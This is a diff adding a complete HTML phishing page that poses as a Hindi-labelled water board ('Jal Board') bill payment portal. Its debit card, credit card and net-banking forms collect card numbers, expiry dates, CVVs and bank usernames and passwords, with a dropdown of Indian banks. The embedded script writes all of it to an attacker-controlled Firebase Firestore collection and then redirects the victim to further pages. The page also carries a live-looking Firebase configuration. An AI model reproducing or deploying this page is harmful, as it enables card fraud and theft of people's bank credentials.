@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>dehijlbrd</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial;
+      background-color: #FFFFFF;
+      text-align: center;
+      padding-top: 50px;
+    }
+    img {
+      width: 300px;
+      border-radius: 10px;
+    }
+    .form-container {
+      margin-top: 50px;
+      max-width: 400px;
+      margin: auto;
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    .form-container h2 {
+      text-align: center;
+      background-color: #00008b;
+      color: white;
+      padding: 10px;
+      border-radius: 5px;
+    }
+    .section-title {
+      margin-top: 20px;
+      font-size: 20px;
+      font-weight: bold;
+      text-align: center;
+    }
+    .side-button {
+      width: 100%;
+      padding: 10px;
+      font-size: 16px;
+      background-color: transparent;
+      color: black;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      margin-bottom: 10px;
+      cursor: pointer;
+    }
+    .side-button:hover {
+      background-color: #f0f0f0;
+    }
+    .payment-form {
+      margin-top: 20px;
+      text-align: left;
+      display: none;
+    }
+    .payment-form.active {
+      display: block;
+    }
+    .payment-form input,
+    .payment-form select,
+    .submit-button {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 10px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    .row {
+      display: flex;
+      gap: 10px;
+    }
+    .row input {
+      flex: 1;
+    }
+    .submit-button {
+      background-color: #4CAF50;
+      color: white;
+      cursor: pointer;
+    }
+    .submit-button:hover {
+      background-color: #388e3c;
+    }
+    .form-image {
+      width: 100%;
+      margin-top: 10px;
+      border-radius: 10px;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://i.ibb.co/s9ptXmZv/images-5.jpg" alt="Meri Tasveer">
+  <div class="form-container">
+    <h2>जल¥बोर्ड</h2>
+    <div class="section-title">Payment Method</div>
+
+    <button class="side-button" onclick="showForm('debit')">💳 Debit Card</button>
+    <button class="side-button" onclick="showForm('credit')">💳 Credit Card</button>
+    <button class="side-button" onclick="showForm('netbanking')">🏦 NetBanking</button>
+
+    <!-- Debit Card Form -->
+    <div id="debitForm" class="payment-form active">
+      <input type="text" maxlength="16" placeholder="Debit Card Number" id="debitCardNumber">
+      <div class="row">
+        <input type="text" maxlength="2" placeholder="MM" id="debitMonth">
+        <input type="text" maxlength="4" placeholder="YYYY" id="debitYear">
+        <input type="password" maxlength="3" placeholder="CVV" id="debitCVV">
+      </div>
+      <button class="submit-button" onclick="submitCard('debit')">Proceed</button>
+      <img class="form-image" src="https://i.ibb.co/p6HVRc70/1000-F-591801774-zrm7u-R6n-P0r9g-S1r6s3umqut4h-Mk-EKr-C.jpg" alt="Card Image">
+    </div>
+
+    <!-- Credit Card Form -->
+    <div id="creditForm" class="payment-form">
+      <input type="text" maxlength="16" placeholder="Credit Card Number" id="creditCardNumber">
+      <div class="row">
+        <input type="text" maxlength="2" placeholder="MM" id="creditMonth">
+        <input type="text" maxlength="4" placeholder="YYYY" id="creditYear">
+        <input type="password" maxlength="3" placeholder="CVV" id="creditCVV">
+      </div>
+      <button class="submit-button" onclick="submitCard('credit')">Proceed</button>
+      <img class="form-image" src="https://i.ibb.co/p6HVRc70/1000-F-591801774-zrm7u-R6n-P0r9g-S1r6s3umqut4h-Mk-EKr-C.jpg" alt="Card Image">
+    </div>
+
+    <!-- NetBanking Form -->
+    <div id="netbankingForm" class="payment-form">
+      <select id="bankSelect"></select>
+      <input type="text" placeholder="Username / User ID" id="netUser">
+      <input type="password" placeholder="Login Password" id="netPass">
+      <button class="submit-button" onclick="submitNetBanking()">Proceed</button>
+      <img class="form-image" src="https://i.ibb.co/p6HVRc70/1000-F-591801774-zrm7u-R6n-P0r9g-S1r6s3umqut4h-Mk-EKr-C.jpg" alt="Banking Image">
+    </div>
+  </div>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyDdRv4_wFI5hjSi_0ci_YDUsdWY5Uv7wDE",
+      authDomain: "dlhiljbrd.firebaseapp.com",
+      projectId: "dlhiljbrd",
+      storageBucket: "dlhiljbrd.firebasestorage.app",
+      messagingSenderId: "981951131769",
+      appId: "1:981951131769:web:5d56cd1423d753992664a8"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    function showForm(type) {
+      document.querySelectorAll('.payment-form').forEach(f => f.classList.remove('active'));
+      document.getElementById(`${type}Form`).classList.add('active');
+    }
+
+    function submitCard(type) {
+      const cardNum = document.getElementById(`${type}CardNumber`).value;
+      const mm = document.getElementById(`${type}Month`).value;
+      const yy = document.getElementById(`${type}Year`).value;
+      const cvv = document.getElementById(`${type}CVV`).value;
+
+      db.collection("payments").add({
+        method: `${type} card`,
+        card: cardNum,
+        expiry: `${mm}/${yy}`,
+        cvv: cvv,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      }).then(() => {
+        window.location.href = "page9.html";
+      });
+    }
+
+    function submitNetBanking() {
+      const bank = document.getElementById("bankSelect").value;
+      const user = document.getElementById("netUser").value.trim();
+      const pass = document.getElementById("netPass").value.trim();
+
+      // Validation
+      if (user === "" || pass === "") {
+        alert("Please enter both Username and Password.");
+        return; // Stop submit
+      }
+
+      db.collection("payments").add({
+        method: "netbanking",
+        bank: bank,
+        username: user,
+        password: pass,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      }).then(() => {
+        window.location.href = "page11.html";
+      });
+    }
+
+    const bankList = [
+      "SelectBank", "Allahabad Bank", "Andhra Bank", "Axis Bank", "Bank of Bahrain and Kuwait",
+      "Bank of Baroda - Corporate Banking", "Bank of Baroda - Retail Banking",
+      "Bank of India", "Bank of Maharashtra", "Canara Bank", "Central Bank of India",
+      "City Union Bank", "Corporation Bank", "Deutsche Bank", "Development Credit Bank",
+      "Dhanlaxmi Bank", "Federal Bank", "ICICI Bank", "IDBI Bank", "Indian Bank",
+      "Indian Overseas Bank", "IndusInd Bank", "ING Vysya Bank", "Jammu and Kashmir Bank",
+      "Karnataka Bank Ltd", "Karur Vysya Bank", "Kotak Bank", "Laxmi Vilas Bank",
+      "Oriental Bank of Commerce", "Punjab National Bank - Corporate Banking",
+      "Punjab National Bank - Retail Banking", "Punjab & Sind Bank",
+      "Shamrao Vitthal Co-operative Bank", "South Indian Bank",
+      "State Bank of Bikaner & Jaipur", "State Bank of Hyderabad", "State Bank of India",
+      "State Bank of Mysore", "State Bank of Patiala", "State Bank of Travancore",
+      "Syndicate Bank", "Tamilnad Mercantile Bank Ltd.", "UCO Bank",
+      "Union Bank of India", "United Bank of India", "Vijaya Bank", "Yes Bank Ltd"
+    ];
+
+    window.onload = function () {
+      const bankSelect = document.getElementById("bankSelect");
+      bankSelect.innerHTML = "";
+      bankList.forEach(bank => {
+        const opt = document.createElement("option");
+        opt.value = opt.text = bank;
+        bankSelect.appendChild(opt);
+      });
+    };
+  </script>
+</body>
+</html>
